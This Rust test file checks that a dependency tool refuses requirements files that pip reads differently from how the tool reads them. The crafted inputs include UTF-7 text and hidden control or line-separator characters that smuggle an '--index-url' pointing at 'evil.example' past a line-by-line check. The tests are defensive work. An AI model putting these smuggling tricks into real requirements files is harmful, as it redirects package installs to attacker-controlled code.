//! pip decodes a requirements file before it reads it, and `sv` judges the file as UTF-8. A file the two read
//! differently can hold lines only pip sees (ADR-052, Later, 21 November 2026): these show such a file passing the
//! check of each line, which is the attack, and being refused all the same.

use super::{plan, read_another_way, unpinned};

/// In UTF-7, `+AAo-` is a line feed, `+ACA-` a space, `+ADo-` a colon, and `+AC8-` a slash. To `sv` this is a
/// comment and one pinned requirement; to pip it is `flask==3.0.0`, `--no-binary :all:`, and `--index-url
/// https://evil.example/simple`.
const UTF7: &str = "# -*- coding: utf-7 -*-\n\
                    flask==3.0.0+AAo---no-binary+ACAAOg-all+ADoACg---index-url+ACA-https+ADo-+AC8-+AC8-evil.example+AC8-simple\n";

fn app(name: &str, requirements: &str) -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("sv-install-{name}-{}", std::process::id()));
    std::fs::remove_dir_all(&dir).ok();
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("requirements.txt"), requirements).unwrap();
    dir
}

#[test]
fn a_file_that_names_its_own_encoding_is_refused_though_every_line_reads_as_pinned() {
    // The setup is the attack: line by line, nothing is wrong with it.
    assert_eq!(
        unpinned(UTF7),
        Vec::<String>::new(),
        "the setup: each line passes as an exact version"
    );
    let dir = app("utf7", UTF7);
    let refused = plan(&dir, "python:3.12-slim").unwrap_err();
    assert!(
        refused.contains("names an encoding for itself on line 1")
            && refused.contains("Nothing was installed"),
        "{refused}"
    );
    std::fs::remove_dir_all(&dir).ok();
    // On the second line too, where pip also looks, and written the other way.
    assert!(read_another_way("# a note\n# vim: set fileencoding=utf-7 :\nsix==1.16.0\n").is_some());
    // From the third line on pip does not look, and neither does this.
    assert_eq!(
        read_another_way("six==1.16.0\nflask==3.0.0\n# coding: utf-7\n"),
        None
    );
}

#[test]
fn a_character_pip_ends_a_line_at_and_sv_does_not_is_refused() {
    // A form feed, or a carriage return on its own, inside a comment: one comment to `sv`, and to pip a comment
    // and then an option.
    for hidden in ["\u{c}", "\r", "\u{b}", "\u{1c}"] {
        let text =
            format!("# a note{hidden}--index-url https://evil.example/simple\nsix==1.16.0\n");
        assert_eq!(
            unpinned(&text),
            Vec::<String>::new(),
            "the setup: read as a comment and a pinned line ({hidden:?})"
        );
        let dir = app("control", &text);
        let refused = plan(&dir, "python:3.12-slim").unwrap_err();
        assert!(
            refused.contains("a control character on line 1"),
            "{hidden:?}: {refused}"
        );
        std::fs::remove_dir_all(&dir).ok();
    }
    // The same for the line ends that are not ASCII, and for a byte-order mark, which names an encoding.
    for hidden in ["\u{85}", "\u{2028}", "\u{2029}"] {
        let text =
            format!("# a note{hidden}--index-url https://evil.example/simple\nsix==1.16.0\n");
        assert!(read_another_way(&text).is_some(), "{hidden:?}");
    }
    assert!(read_another_way("\u{feff}six==1.16.0\n").is_some());
}

#[test]
fn a_plain_file_is_still_installed_from() {
    for plain in [
        "six==1.16.0\n",
        "six==1.16.0\r\nflask==3.0.0\r\n",
        "# what the app needs\n\tsix==1.16.0  # pinned\nflask[async]==3.0.0 ; python_version >= \"3.9\"\n",
        "six==1.16.0",
    ] {
        assert_eq!(read_another_way(plain), None, "{plain:?}");
        let dir = app("plain", plain);
        assert_eq!(
            plan(&dir, "python:3.12-slim").unwrap().len(),
            1,
            "{plain:?}"
        );
        std::fs::remove_dir_all(&dir).ok();
    }
}
